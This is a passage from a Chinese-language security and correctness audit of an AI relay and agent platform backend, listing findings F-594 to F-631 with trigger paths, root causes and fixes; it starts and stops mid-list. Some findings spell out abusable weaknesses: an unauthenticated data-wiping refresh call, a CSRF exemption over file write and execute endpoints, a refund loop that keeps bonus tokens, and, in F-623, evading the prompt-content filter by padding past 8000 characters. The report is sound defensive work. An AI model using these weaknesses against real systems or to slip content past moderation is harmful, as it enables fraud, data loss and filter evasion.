- 影响面：可读未上架/审核中/已下线 agent 的系统提示词与 Coze 变量（可能含凭据），核心资产与草稿内容泄露。
- 建议修法：显式列 + 发布态/归属校验，`agentPrompt/agentVariables/cozeAccountId` 永不出现在公开响应。
- 是否当场可修：是。

#### F-594 任意登录用户可触发 `agent-heat/refresh`，删改任意日期的全站热度
- 严重度：P2
- 文件与行号：`routes/statistics.ts:668-705`（删除 `:686`、插入 `:688-696`）；`:76-78,84-87`；schema `agents-extended.ts:193`
- 触发路径：任意登录用户 `POST /api/statistics/agent-heat/refresh {"dateStr":"2025-01-01"}`，可重复。
- 根因：写操作放在只做 `checkAuth` 的公共插件；`dateStr` 客户端任意指定且仅 `z.string().min(1)`；delete+insert 未包事务。
- 证据：`:670-674` 直接采用 `dateStr`；`:686` `DELETE ... WHERE date_str = ?`；`:688-695` 重新插入；`:193` 仅 `(agent_id,date_str)` 唯一键。
- 影响面：任何人可抹掉某日全站热度并回填当前累计值；并发调用触发唯一冲突 500 且删除已提交导致当日数据整段丢失；全表扫可做放大攻击。
- 建议修法：加 `requireAdmin`；`dateStr` 限格式且只允许今天；delete+insert 包事务或改 upsert。
- 是否当场可修：是。

#### F-595 AI Feed 详情不过滤发布态，草稿可按 id 直读
- 严重度：P3
- 文件与行号：`db/ai-feed-post-queries.ts:33-36`；对照列表 `:14`；路由 `routes/user/ai-feed-routes.ts:33-39`
- 触发路径：登录用户 `GET /api/ai-feed/<草稿id>`。
- 根因：详情只按主键，缺列表同款 `isPublished && status=1`。
- 证据：`:14` `conds = [eq(isPublished,true), eq(status,1)]`；`:34` `db.select().from(aiFeedPosts).where(eq(id, id)).limit(1)`。
- 影响面：未审核/已下架资讯可被持 id 的登录用户读取（uuid 不易枚举）。
- 建议修法：详情加同一对条件或路由层判后 404。
- 是否当场可修：是。

#### F-596 图形验证码 `expiresAt` 只写不校验，过期码最长约 24 小时仍有效
- 严重度：P3
- 文件与行号：`db/captcha-queries.ts:20-31`；`routes/auth-extended.ts:1745-1750`；`jobs/ops-retention-cleanup.ts:71-73`
- 触发路径：`GET /api/auth/captcha` 取码 → 不立即验证 → 次日 05:30 清理前调用 `POST /api/auth/captcha/verify`。
- 根因：`saveCaptcha` 写 `expiresAt=now+5min`，但 `findCaptcha` 与验证路由都不比较该列；只靠每日清理删除。
- 证据：`:24` 写 5 分钟过期；`:29` 查询无 `gt(expiresAt, now)`；`auth-extended.ts:1745-1749` 取行→比对→删除，无过期判断。
- 影响面：有效期语义失效（5 分钟 → 最长约 24 小时），可预解验证码择时使用。
- 建议修法：查询加 `gt(expiresAt, now)`，过期行同样删除并回 400。
- 是否当场可修：是。

#### F-597 UGC 敏感词过滤按字段重复全表查询（N+1）
- 严重度：P3
- 文件与行号：`db/sensitive-words-queries.ts:77-83,94,163-174`
- 触发路径：`POST /api/comments`、`/api/community/posts|asks|circles` 等任一 UGC 写入（标题+正文+标签，每字段一次）。
- 根因：`sanitizeUgcInput` 在字段循环内调 `filterSensitiveContent`，后者每次 `findActiveSensitiveWords()` 拉整张启用词表，无缓存、无批量。
- 证据：`:163-168` `for (const [field, raw] of Object.entries(texts)) { await filterSensitiveContent(raw) }`；`:94` `const words = await findActiveSensitiveWords()`；`:77-83` 无 limit、无缓存。
- 影响面：一条 3 字段写请求 = 3 次敏感词全表读；词表与发帖量越大成本线性放大。
- 建议修法：循环外取一次词表传入，或加 30–60s 进程内 TTL 缓存。
- 是否当场可修：是。

#### F-598 `toggleLike` 读改写竞态：并发/重试把已点赞反转为取消
- 严重度：P3
- 文件与行号：`db/resource-likes-queries.ts:13-41`
- 触发路径：同一用户并发两次点赞（双击、客户端超时重试、网关重放）。
- 根因：注释声称 `onConflictDoNothing` 保证并发安全，但 toggle 语义下插入成功者返回 liked，冲突者直接 DELETE 掉对方刚插入的行。
- 证据：`:20-27` `insert().onConflictDoNothing().returning()`，`length>0` 返回 true；`:33-40` 否则 `delete().where(...)` 返回 false。
- 影响面：双请求最终为“未点赞”，与用户操作相反。
- 建议修法：拆成幂等 like/unlike 端点，或冲突时不删除、由调用方显式 unlike。
- 是否当场可修：是。

#### F-599 `deletePermission` 三次删除无事务，中途失败产生“半删”
- 严重度：P3
- 文件与行号：`db/workspace-permission-queries.ts:104-135`
- 触发路径：工作区权限删除（规则 → 审计日志 → 主记录）。
- 根因：三条独立 `db.delete` 顺序执行，未包事务。
- 证据：`:109-116` 删规则；`:117-124` 删审计日志；`:125-133` 删主记录并 `returning({id})`。
- 影响面：主记录删除失败时规则与审计日志已不可恢复丢失，审计链断裂。
- 建议修法：`db.transaction` 包住三条删除。
- 是否当场可修：是。

#### F-600 多处分页缺稳定 tiebreaker（F-572 同根的新出口）
- 严重度：P3
- 文件与行号：`db/ai-feed-post-queries.ts:22`；`db/mcp-queries.ts:22`；`db/openclaw-queries.ts:22`；`db/private-letters-admin-queries.ts:50`；`db/security-logs-queries.ts:20`；`db/statistics-queries.ts:198,444`；`db/workflow-queries.ts:77,180,342`；`db/sensitive-words-queries.ts:38`
- 触发路径：任一列表在时间列相同（批量导入、同秒创建、同事务 `defaultNow()`）时翻页。
- 根因：`ORDER BY <时间列> DESC` 未追加唯一列，PG 对并列行顺序不保证稳定。
- 证据：如 `ai-feed-post-queries.ts:22` `.orderBy(desc(createdAt))`；`statistics-queries.ts:444` `.orderBy(desc(visitLogs.createdAt))`。对照正确样例 `topic-queries.ts:40` 追加 `desc(id)`。
- 影响面：翻页重复/漏行；访问明细导出可能漏数据。
- 建议修法：`ORDER BY <时间列> DESC, id DESC` 或改游标分页。
- 是否当场可修：是。

#### F-601 `findAgentTasksByAgentId` 先取 500 行再内存过滤，热门 agent 下用户看不到自己的任务
- 严重度：P3
- 文件与行号：`db/agent-queries.ts:42-43,123-131`；调用 `routes/subagent-dispatch.ts:870-899`
- 触发路径：`GET /api/subagents/by-agent/:agentId/summary`。
- 根因：SQL 只按 `agentId` 取最近 500 行，可见性过滤在内存完成。
- 证据：`:42` `AGENT_TASK_SCAN_LIMIT = 500`；`:123-128` `.where(eq(agentId)).orderBy(desc(createdAt)).limit(500)`；`:131` `rows.filter(...).slice(0, limit)`。
- 影响面：高频公共 agent 下自己的历史派单被挤出窗口，页面误显示无数据；每次多拉 500 行。
- 建议修法：可见性条件下推 SQL 并直接 `LIMIT limit`。
- 是否当场可修：是。

#### F-602 语音笔记 `groups` 分面统计忽略筛选条件，与 list/total 口径不一致
- 严重度：P3
- 文件与行号：`db/voice-note-queries.ts:82-107`
- 触发路径：`GET` 语音笔记列表带 `partition=archived`/`q`/`groupKey`/`conversationId` + `withGroups=true`。
- 根因：list 与 count 用完整 `where`，groups 只用 `userId`。
- 证据：`:82-93` 完整 where 用于 list/count；`:97-107` `.where(eq(userId)).groupBy(groupKey)`。
- 影响面：分组角标数大于当前列表 total，出现“列表 0 条但分组显示 10 条”。
- 建议修法：groups 复用同一 where（除 groupKey 外）。
- 是否当场可修：是。

#### F-603 统计口径不一致：系统账号计入“用户数”、未发布课程浏览量计入“总浏览”
- 严重度：P3
- 文件与行号：`db/statistics-queries.ts:45-54,111,393-413`
- 触发路径：后台总览/内容统计与用户中心同屏对照。
- 根因：同类指标各写一套条件：`memberTotal` 一处无排除、另一处 `isSystemAdmin=false`；`viewSum` 只按 `status=1`（含未发布）而 `lessonPublished` 要求 `isPublished && status=1`。
- 证据：`:45` `count(*) from lessons`；`:52-54` `sum(viewCount) where status=1`；`:49` `where(isPublished && status=1)`；`:111` `count(*) from users`；`:395-400` 显式排除 admin。
- 影响面：后台卡片数字自相矛盾，运营报表口径不可复核。
- 建议修法：抽公共口径函数/常量统一引用。
- 是否当场可修：是。

#### F-604 MCP / Openclaw 详情不过滤 status，禁用条目可按 id 直读
- 严重度：P3
- 文件与行号：`db/mcp-queries.ts:14,33-36`；`db/openclaw-queries.ts:14,33-36`
- 触发路径：登录用户 `GET /api/user/mcp/:id`、`GET /api/user/openclaw/:id`。
- 根因：与 F-595 同型，列表带 `status=1`，详情只按主键。
- 证据：`mcp-queries.ts:14` `conds=[eq(status,1)]`；`:34` `select().from(mcpServers).where(eq(id,id)).limit(1)`。
- 影响面：已禁用/下架条目（endpoint/content）可被持 id 用户读取，字段无凭据故影响低。
- 建议修法：详情补 `status=1` 或路由层 404。
- 是否当场可修：是。

### 第二十轮 C 路：plugins

#### F-605 异常行为风控挂在 onRequest，`request.userId` 恒空，用户维度 4/6 全失效
- 严重度：P1
- 文件与行号：`plugins/anomaly-detector-plugin.ts:87`；`services/anomaly-detector.ts:202-204,256-259,280-281,316,424`
- 触发路径：任意请求 → `onRequest` 读 `request.userId`；该字段只由路由 `preHandler` 的 `authenticate()` 写入（`plugins/auth.ts:294`），此时恒 `undefined`。
- 根因：钩子类型选错（onRequest 早于鉴权），所有依赖 userId 的维度短路。
- 证据：`:87` `const userId = request.userId`（注释自述 onRequest 尚无）；`anomaly-detector.ts:202` `userCount = ctx.userId ? ... : 0`；`:280/:316/:424` `if (!ctx.userId) return {score:0}`；权重 `:153-168` `freq .25 / time .1 / geo .15 / device .15 / pattern .2 / baseline .15`；无 userId 时 `time` 恒 30、geo/device/baseline 恒 0。
- 影响面：加权上限 `100*.25 + 100*.2 + 30*.1 = 48`，永远到不了 `challenge(>60)`/`block(>80)` → 两条 403 分支为死代码；地理跳变、设备突变、行为基线、用户级频率风控全部失效。
- 建议修法：移到 `preHandler`（authenticate 之后），或两段式（onRequest 做 IP/扫描器，认证后补用户维度）。
- 是否当场可修：是。

#### F-606 OTel 自动插桩把带凭据的完整 URL 导出到 trace 后端
- 严重度：P2
- 文件与行号：`plugins/otel.ts:80-82,105-113`
- 触发路径：生产设置 `OTEL_EXPORTER_OTLP_ENDPOINT` → 请求 `/api/ws/ai?token=<WS票>` 或 `/v1/realtime?api_key=<key>` → `instrumentation-http` 入站 span 携带 query。
- 根因：只关了 fs 插桩，未给 http 插桩加 `ignoreIncomingRequestHook/requestHook` 剥离 query；`trace.ts:12-14` 已记载这两条凭据走 query，但该收窄只作用于 pino。
- 证据：`:80-82` `getNodeAutoInstrumentations({'@opentelemetry/instrumentation-fs': {enabled:false}})`。
- 影响面：长期 `api_key` 与 5 分钟 WS 票落入 trace 存储（`url.full/url.query/http.target`），有 collector 读权限者可重放。
- 建议修法：http 插桩对这两条路径跳过，或 `requestHook` 删除 query；或凭据改走 header。
- 是否当场可修：是。

#### F-607 Bulkhead 唤醒等待者后不复查名额，并发上限被突破
- 严重度：P2
- 文件与行号：`plugins/resilience-extended.ts:48-63`；调用 `routes/chat-models.ts:536,917,1343`（本轮 Grep 确认存在调用方）
- 触发路径：`getBulkhead('ai-call',10,50).execute()` 满并发排队；一个任务结束 `active--` 后 `next()`（微任务），等待者恢复前若新请求看到 `active < max` 也 `active++`，之后等待者再 `active++`。
- 根因：`await new Promise(...)` 唤醒后不重新判 `active >= max`，唤醒与占位非原子。
- 证据：`:49-55` 满则入队 `await new Promise(resolve => queue.push(resolve))`；`:56` 无条件 `this.active++`；`:60-63` 释放时 `active--` 并 `next()`。
- 影响面：`ai-call(10)`/`file-upload(3)`/`stock-ai(5)` 高峰期超额，隔离失效，放大上游 429 与内存压力。
- 建议修法：由释放方直接移交名额（唤醒时不清 active），或恢复后 `while (active >= max) await` 再自增。
- 是否当场可修：是。

#### F-608 Bulkhead.reset() 清空队列但不 resolve，排队请求永久挂起
- 严重度：P2
- 文件与行号：`plugins/resilience-extended.ts:75-78`；触发 `routes/health.ts:219`
- 触发路径：`POST /api/health/...` 复位熔断 → `resetBulkhead('ai-call')` → 队列清空，`await new Promise` 的调用方永不 resolve/reject。
- 根因：`reset()` 直接 `this.queue = []`，丢弃 resolve 句柄。
- 证据：`:76-78` `reset(): void { this.queue = [] }`。
- 影响面：复位瞬间最多 50 个 AI 请求永久悬挂（连接/内存/客户端超时堆积），与“重置恢复服务”目的相反。
- 建议修法：reset 时逐个 reject（`Bulkhead reset` 错误），或提供 drain 语义。
- 是否当场可修：是。

#### F-609 热搜列表按 `asc(sort)` 排序且无 status/limit，与“累加次数”方向相反
- 严重度：P2
- 文件与行号：`db/misc-extended-queries.ts:20-22`；消费 `routes/search.ts:192-198,261`；写入 `plugins/search-aspect.ts:34-37`
- 触发路径：`GET /api/search/hot-words`、`GET /api/search/suggestions`。
- 根因：`search-aspect` 每次搜索 `sort + 1`（越大越热），列表却 `asc(sort)`；查询无 `status='active'`、无 limit。
- 证据：`misc-extended-queries.ts:21` `.orderBy(asc(hotWords.sort), desc(hotWords.createdAt))`；`search-aspect.ts:34` `set({ sort: (existing[0].sort ?? 0) + 1 })`。
- 影响面：热搜榜把最冷门词排最前；后台设非 active 仍展示；全表返回可放大响应体。
- 建议修法：改 `desc(sort)` 或明确 sort 语义；补 `status='active'` 与 limit。
- 是否当场可修：是。

#### F-610 threat-detector 的 `lastCheckTime/watchedIps` 在 IPv6 /64 轮转下无界增长
- 严重度：P2
- 文件与行号：`plugins/threat-detector.ts:75,90-104,136-138,204`
- 触发路径：攻击者从单个 IPv6 /64 用海量源地址请求 → 每个新地址进入两个 Map。
- 根因：清理条件仅 `size > 10000 且 ts < now-5min`，5 分钟内新 key 一律删不掉；IPv6 未按 /64 归一化。
- 证据：`:97-102` 仅删 5 分钟前的条目；`:138` `lastCheckTime.set(ip, now)`；`watchedIps` 同样只有时间淘汰。
- 影响面：内存随请求数线性增长直至 OOM，同时绕过基于 IP 的频率统计。
- 建议修法：Map 加硬上限 + LRU；IPv6 按 /64 归一化。
- 是否当场可修：是。

#### F-611 api-logger 退出时若已有 flush 在途，onClose 的 flush 直接返回，尾部日志丢失
- 严重度：P3
- 文件与行号：`plugins/api-logger.ts:128-141,149-153`
- 触发路径：进程 close 时定时 flush 正在 `await addApiLogsBatch` → onClose 调 `flush()` → `if (flushing) return` → 期间新入缓冲条目永不落库。
- 根因：`flushing` 只做互斥，无“等待在途完成后继续”语义。
- 证据：`:129` `if (flushing || buffer.length === 0) return`；`:150-152` onClose 只 `await flush()`。
- 影响面：重启/发布窗口 api_logs 尾部缺失，审计与自动发现统计开窗失真。
- 建议修法：onClose 等待在途 Promise 后再 flush。
- 是否当场可修：是。

#### F-612 `tenant-db-isolation.withTenant` 的 `SET LOCAL search_path` 不在事务内，实际空操作
- 严重度：P3
- 文件与行号：`plugins/tenant-db-isolation.ts:54-67`（`withTenant` 当前无调用点，仅 decorate）
- 触发路径：任何按注释使用 `server.withTenant(tenantId, fn)` 的新代码。
- 根因：`SET LOCAL` 只在事务块内生效；`db.execute` 走池化连接且未开事务，PG 只发 WARNING；若改 `SET`，池化连接会把 search_path 泄漏给其他请求。
- 证据：`:59` `db.execute(sql\`SET LOCAL search_path TO ${schema}, public\`)`；`:61` `return await fn()`（fn 用全局 db）。
- 影响面：一旦被使用，租户 schema 隔离形同虚设 → 查询落到 public 造成跨租户读写。
- 建议修法：`db.transaction(tx => { tx.execute(SET LOCAL...); return fn(tx) })`。
- 是否当场可修：是。

#### F-613 network-segment 的 Redis 黑名单用 key 级 TTL，与成员级封禁语义冲突
- 严重度：P3
- 文件与行号：`plugins/network-segment.ts:197-209`（`addToBlacklist` 当前无调用点）
- 触发路径：`addToBlacklist(ip, ttl>0)` 时 key 已存在且带 TTL 则不续期；先有永封成员再整体 `expire` 会整批删除。
- 根因：Redis Set 无成员级 TTL，用 key 级 TTL 兜底必然把整张黑名单当过期单位。
- 证据：`:202-207` `sadd(BLACKLIST_KEY, ip)` 后仅在 `ttl<0` 时 `expire(BLACKLIST_KEY, ttlSec)`。
- 影响面：临时封禁按别人的 TTL 过期，或永封被静默清除；多实例语义不一致。
- 建议修法：改 `ip_blacklist:<ip>` 单键 `SET EX`，或 zset(score=expireAt)+`ZREMRANGEBYSCORE`。
- 是否当场可修：是。

#### F-614 CSRF 白名单前缀 `/api/workspace/fs/` 覆盖写/改/删/执行端点
- 严重度：P3
- 文件与行号：`plugins/csrf.ts:205-212`；`routes/workspace-ai.ts:197,226,255,338`
- 触发路径：`/api/workspace/fs/write|edit|delete|run` 均为 POST 且 cookie 鉴权（`plugins/auth.ts:177-191`），但整个前缀被 CSRF 豁免。
- 根因：按前缀豁免且理由写“文件浏览 read-only”，而该前缀下已有四个状态变更/命令执行端点。
- 证据：`:208-212` 注释与 `'/api/workspace/fs/'` 豁免；`workspace-ai.ts:197/226/255/338` 四个 POST。
- 影响面：当前实际屏障是 Cookie `sameSite:'lax'` 与 JSON body；一旦同站子域失守或 SameSite 调整，即可跨站写文件/执行命令。
- 建议修法：删除该前缀豁免，或精确到只读 GET。
- 是否当场可修：是。

#### F-615 `isPrivateIp` 未覆盖 172.16/12 与 IPv6 ULA，metrics 内网白名单与注释不符
- 严重度：P3
- 文件与行号：`services/ip-reputation.ts:82-94`；消费 `plugins/metrics.ts:238-241`
- 触发路径：内网 Prometheus 位于 `172.17.x/172.18.x`（Docker/VPC 常见）→ `GET /metrics` 被判非内网 → 403。
- 根因：只判 `10./192.168./127./169.254.`，同文件已有 `isIpIn172Private`（`:96-102`）未复用。
- 证据：`:87-93` 的四段前缀判断；`metrics.ts:238-241` 注释声称覆盖 RFC1918。
- 影响面：内网监控断采；172.x 内网流量在 anomaly/threat 中被当公网评分。
- 建议修法：复用 `isIpIn172Private`，补 `fc00::/7`、`fe80::/10`。
- 是否当场可修：是。

### 第二十轮 D 路：relay 家族

#### F-616 非流式渠道路由的上游请求无业务超时，且不随请求取消
- 严重度：P1
- 文件与行号：`services/relay-upstream-forwarder.ts:355-373`；调用 `routes/v1-public.ts:1849-1876`（非流式）；`services/relay-outbound-proxy.ts:89`
- 触发路径：`POST /v1/chat/completions`（非流式）→ `forwardToChannel` 未传 signal → 上游建连后迟迟不回响应头。
- 根因：转发层只原样透传 `req.signal`，非流式调用点不传 signal；`Agent` 未配 `headersTimeout/bodyTimeout`，只能吃 undici 默认 300s。
- 证据：`forwarder:358` `signal: req.signal`；`v1-public.ts` 全文仅 3 处 `signal:`（798/817/949，均为流式 controller），`:1849` 调用无 signal。
- 影响面：上游半挂时单请求阻塞最长约 5 分钟且不走 ai-service 回退，连接/内存堆积、P99 塌陷、计费审计缺行。F-493 同根但仅覆盖生图 worker，本条为 chat 非流式新出口。
- 建议修法：`AbortSignal.any([req.signal, AbortSignal.timeout(cfg.relayUpstreamTimeoutMs)])`，并对 dispatcher 设 headers/body timeout。
- 是否当场可修：是。

#### F-617 任何非 2xx 都计入渠道熔断，3 个客户端错误请求即可打掉全部候选
- 严重度：P1
- 文件与行号：`relay-upstream-forwarder.ts:379-386`；`relay-channel-router.ts:44,345-353`
- 触发路径：合法 API Key 连续发 3 次会返回 400/404/422 的请求（错误参数、未知 model、超长上下文）→ 每个失败对每个候选（默认 3）计一次失败 → 每个 keyPool 累计 ≥3 → `open` 60s。
- 根因：`!resp.ok` 一律 `recordChannelResult(false)`，未区分 4xx 客户端错误与 5xx/429 渠道故障。
- 证据：`:379-383` `if (!resp.ok || !resp.body) { ... await recordChannelResult(channel.keyPoolId, false, ...); continue }`；`router:44` 阈值常量，`:345-353` `failureCount >= 3 → open`。
- 影响面：自伤式熔断，一次坏请求“三倍放大”成 3 个渠道失败；恶意用户 3 个请求可把中转打回 ai-service，成本与可用性双输。
- 建议修法：仅 5xx/429/网络错误计失败；4xx 直接 fail-fast；401/403 只标记该 key 凭据异常。
- 是否当场可修：是。

#### F-618 failover 丢弃非 2xx 响应体未 cancel，连接不归还连接池
- 严重度：P2
- 文件与行号：`relay-upstream-forwarder.ts:379-384`
- 触发路径：上游持续 4xx/5xx（尤其坏 key 的 401）→ 每次 `continue` 前 `resp.body` 未消费/未取消。
- 根因：undici 需消费或取消 body 才归还 socket。
- 证据：`:379-383` 分支内无 `resp.body.cancel()` 直接 `continue`。
- 影响面：高频失败时句柄堆积，最终连接池耗尽表现为整体超时，与 F-617 叠加。
- 建议修法：`await resp.body?.cancel().catch(()=>{})` 后再 continue，或在 finally 统一清理。
- 是否当场可修：是。

#### F-619 在途闸 TTL 120s 短于长流时长，且只在 acquire 续期 → 计数中途清零超卖
- 严重度：P2
- 文件与行号：`services/relay-account-shared-state.ts:302,353`
- 触发路径：cap=10，10 条 >120s 长流同时开始后无新请求；120s 后键过期计数归零，第 121s 起新请求继续放行。
- 根因：TTL 是固定安全网，只在 acquire 时 `PEXPIRE`；长连接期间无心跳续期。
- 证据：`:302` `GLOBAL_INFLIGHT_TTL_MS`（120s）；`:353` acquire 时 `pexpire`，无定时续期。
- 影响面：全局并发闸在长流场景失效，账号池被超额冲击，上游限流/封号。
- 建议修法：TTL 设为 `maxUpstreamTimeout + buffer`，并对每个 handle 定时续期；或改 ZSET 记录每条腿。
- 是否当场可修：是。

#### F-620 Key 三窗口限流预检读副本 + 先查后计，并发与失败请求均超发
- 严重度：P2
- 文件与行号：`services/key-rate-window-service.ts:82-119,127-158`；`services/relay-billing-service.ts:1258-1261`
- 触发路径：Key 配 `rate_limit_5h/1d/7d` → 从 `dbRead` 读计数 → 放行 → 成功后异步 `incrKeyRateWindows()`。
- 根因：校验与计数分离且非原子；校验读副本；失败请求不计。
- 证据：`:82-119` `dbRead.select(...).from(keyRateWindowCounts)` 后 `if (used >= limit) return {allowed:false}`；`:127-158` 成功后才异步 +1。
- 影响面：并发突发超发 N 倍；副本延迟期近似失效；可故意失败刷窗口内免费额度。
- 建议修法：单条原子 `INSERT ... ON CONFLICT DO UPDATE ... WHERE request_count < limit RETURNING`；失败请求也计数。
- 是否当场可修：是。

#### F-621 代理池成功计数非原子且无条件清零，坏代理不达阈值；exhausted 后无自愈
- 严重度：P2
- 文件与行号：`services/relay-proxy-pool.ts:164-193,196-213,226-236`
- 触发路径：并发共用同一代理、部分失败 → `reportProxyFailure` 读副本得 `failCount` 再写回 `+1`（丢更新）；任一成功把 `failCount` 清 0；转 `exhausted` 后不再被选中，成功上报再也不会发生。
- 根因：读-改-写跨主/副本；成功/失败上报互相覆盖；exhausted 无定时复检。
- 证据：`:170-180` `dbRead.select(...)` 后 `update(...).set({failCount: row.failCount+1, ...})`；成功分支 `set({failCount:0, status:'active'})`。
- 影响面：间歇故障代理永不淘汰，真正被淘汰的代理池永久缩小。
- 建议修法：`UPDATE ... SET fail_count = fail_count + 1, status = CASE ...`；成功只清计数不清状态；加定时探活恢复。
- 是否当场可修：是。

#### F-622 出网代理 URL（通常含账号密码）明文写入启动日志
- 严重度：P2
- 文件与行号：`services/relay-outbound-proxy.ts:107-109`
- 触发路径：配置 `RELAY_PROXY_URL=http://user:pass@host:port` → 启动时 `logger.info` 全量打印。
- 根因：同文件/同仓其他位置有 `maskProxyUrlForLog`，唯独启动日志未脱敏。
- 证据：`:107-109` `logger.info(... ${proxyUrl} ...)`。
- 影响面：代理凭据落入日志采集系统。
- 建议修法：`maskProxyUrlForLog(proxyUrl)`。
- 是否当场可修：是（一行）。

#### F-623 提示词审计只扫前 8000 字符，前置填充即可绕过 block 规则
- 严重度：P2
- 文件与行号：`services/relay-prompt-audit-service.ts:44,145-146`
- 触发路径：prompt 前部填充 8000+ 字符无关文本，违规内容置于其后。
- 根因：`slice(0, MAX_SCAN_CHARS)` 截断后再 `indexOf`。
- 证据：`:44` `const MAX_SCAN_CHARS = 8000`；`:145-146` `const scanTarget = raw.slice(0, MAX_SCAN_CHARS)`。
- 影响面：内容审核/拦截零成本绕过，且审计日志无记录。
- 建议修法：分块滑动扫描全文（8KB 窗口 + `maxKeywordLen-1` 重叠），或超长文本直接 block/人工复核。
- 是否当场可修：是。

#### F-624 运维 WS 快照按 socket 各自重建 + refresh 无节流，可放大为 DB 压力
- 严重度：P2
- 文件与行号：`plugins/ws-relay-ops.ts:56-66,87-88,102`；`services/relay-ops-snapshot.ts:129-140,154-162,202-242`
- 触发路径：管理员打开 1~2 个页面 → 每个 socket 每 15s 各自构建整帧；连续发 `{"type":"refresh"}` → 每条触发 4 次大范围 `llm_call_logs` 聚合 + 逐组/逐成员查询。
- 根因：无单飞/缓存/限频；同帧被 N 个连接重复计算。
- 证据：`ws-relay-ops.ts:87-88` `pushSnapshot(socket)` + `setInterval(() => pushSnapshot(socket), PUSH_INTERVAL_MS)`；`:102` `if (parsed?.type === 'refresh') pushSnapshot(socket)`。
- 影响面：一个 admin token 即可把只读副本打满，影响其他后台功能。F-226 只覆盖双重 release，本条为无节流/无单飞。
- 建议修法：refresh 最小间隔 + 单飞去重；快照加 5s 共享缓存；聚合走预聚合表。
- 是否当场可修：是。

#### F-625 live-probe 的 withTimeout 不取消底层请求，超时后连接继续占用
- 严重度：P3
- 文件与行号：`services/relay-live-probe.ts:246-258,520-525`
- 触发路径：探针 `checkHealth` 卡住 → `Promise.race` 超时返回，但底层 fetch 未被 abort。
- 根因：适配器契约无 signal，超时只是放弃等待。
- 证据：`:246-258` `Promise.race([p, new Promise((_, reject) => setTimeout(...))])`；`:520-525` 调用未传 signal。
- 影响面：运维探针路径（env 门控）句柄滞留，探针结果与真实状态错位。
- 建议修法：适配器加 signal，探针用 `AbortSignal.timeout` 或独立 dispatcher 限时。
- 是否当场可修：是。

#### F-626 模型别名解析走只读副本且无缓存，删除/禁用别名仍有复制延迟窗口生效
- 严重度：P3
- 文件与行号：`services/relay-model-catalog.ts:25-46`
- 触发路径：管理端删除/禁用别名（写主库）→ 副本追平前请求仍命中 → 继续使用应下线模型；每请求多一次 DB 查询。
- 根因：解析固定 `dbRead` 且无 TTL 缓存。
- 证据：`:30` `dbRead.select(...)`；`:25-46` 无缓存层。
- 影响面：下线动作非即时生效（安全/合规边界），高 QPS 无缓存放大。
- 建议修法：进程内 TTL 缓存 + 写后失效，或删除后短时直查主库。
- 是否当场可修：是。

#### F-627 候选循环内重复 `JSON.stringify(body)`，图片/长上下文请求最多 3 次大对象序列化
- 严重度：P3
- 文件与行号：`services/relay-upstream-forwarder.ts:362`
- 触发路径：图片生成/长上下文走 `forwardToChannel` 且首个候选失败 → 每个候选重新序列化整包。
- 根因：序列化位于 `for (const channel of candidates)` 内。
- 证据：`:362` 循环体内 `body: JSON.stringify(body)`。
- 影响面：单请求额外 CPU/内存峰值与 GC 抖动，与 F-616/F-618 失败场景叠加放大。
- 建议修法：循环外序列化一次复用。
- 是否当场可修：是（一行）。

### 第二十轮 E 路：金额与时间边界

#### F-628 中转成本汇总读 `metadata->>'costCents'`，而写侧已迁到顶层列 → 汇总恒 0
- 严重度：P1
- 文件与行号：`routes/admin/relay-logs.ts:464`；`routes/developer-relay.ts:372,393`；`routes/admin/relay-stats.ts:55,79,156,208,264,270`；`routes/earnings-routes.ts:180,192`；`services/relay-ops-snapshot.ts:134,158`；`routes/admin-ops-wallboard.ts:835`；写侧 `services/relay-billing-service.ts:1191,1217`
- 触发路径：任一中转调用 → `recordCall()` 写 `llm_call_logs` → 管理端 `/admin/relay/stats`、`/admin/relay/logs` 汇总、开发者 `/developer/relay`、财务 `/earnings`、运营大屏。
- 根因：2026-08-01 `costCents` 从 `metadata` 迁到顶层列，写侧只写列；读侧汇总仍取 JSON 键，`COALESCE(NULL,0)=0`。
- 证据：`relay-billing-service.ts:1191` 注释“costCents 从 metadata 迁移到顶层列”，`:1217` 落 `costCents: input.costCents ?? ...`；同仓 `relay-logs.ts:248/353/390` 明细与筛选已用顶层 `llmCallLogs.costCents`，唯独 `:464` 汇总用 `metadata->>'costCents'`。
- 影响面：单次 0.42 分 ×1000 真实 420 分，汇总得 0；中转收入/成本/毛利率、模型分布、Top 用户、成本异常告警（快照总成本 0 → 阈值永不触发）全部系统性归零。F-573 只报“行级 `::int` 截断”，本条是更前置的“读错列/键”，两者可叠加。
- 建议修法：所有汇总改用 `llmCallLogs.costCents`；过渡期可 `COALESCE(cost_cents, (metadata->>'costCents')::numeric)`。
- 是否当场可修：是。

#### F-629 充值退款不回收“充值赠送”token，可循环套利
- 严重度：P1
- 文件与行号：`services/order-service.ts:181-189`（发放）；`:660-667`（退款扣回）
- 触发路径：自定义金额充值（`orderType=2 && !productId`）→ 支付成功发放主额 + 赠送 → `refundOrder` 退款。
- 根因：赠送流水幂等键为 `bonus:${orderNo}`，退款只按 `orderNo` 扣 `order.amount`，两笔流水互不匹配。
- 证据：`:165` `rechargeToken(userId, order.amount, orderNo, '充值')`；`:188` `rechargeToken(userId, bonusCents, \`bonus:${orderNo}\`, '充值赠送')`；`:662` `refundTokenDeduct(userId, order.amount, orderNo, '退款')` 不含 bonus。
- 影响面：充 ¥100（默认 1.2 倍 + 20 赠送）到账 16000 token，退款只扣 10000，净留 6000（≈¥60）；“充值→退款”可循环套利，且对账只有退款流水没有赠送回收。
- 建议修法：退款按 `related_order_no IN (orderNo, 'bonus:'+orderNo)` 一并冲销，或按退款比例扣减赠送并写回收流水。
- 是否当场可修：是（部分退款比例规则需产品确认）。

#### F-630 运营大屏“近 14 日新增用户”SQL 二次 +8h，每天 16:00 后算到次日
- 严重度：P2
- 文件与行号：`routes/admin-ops-wallboard.ts:880`；对照 `:884`、`:779`
- 触发路径：打开运营大屏业务纵深“新增用户趋势”。
- 根因：PG 会话已钉 `Asia/Shanghai`（`config/host-timezone.json:48`），`to_char(timestamptz)` 本身就是上海日；代码再 `+ interval '8 hours'` 等于 +16h。
- 证据：`:880` `date: sql\`to_char(${users.createdAt} + interval '8 hours','YYYY-MM-DD')\``；`:884` 过滤用 `bizDayStartUtc(13)`；`:779` `todayNew` 用真实上海日界。
- 影响面：新增曲线右移 8 小时，今天柱少算 16:00 后注册；“今日新增”与趋势图自相矛盾。
- 建议修法：删除 `+ interval '8 hours'`，或统一用 `bizDayKeyAgo()` 生成日期轴 + `AT TIME ZONE 'Asia/Shanghai'`（二选一）。
- 是否当场可修：是。

#### F-631 开发者账单月份取 UTC（`toISOString().slice(0,7)`）
- 严重度：P2
- 文件与行号：`routes/developer.ts:910`
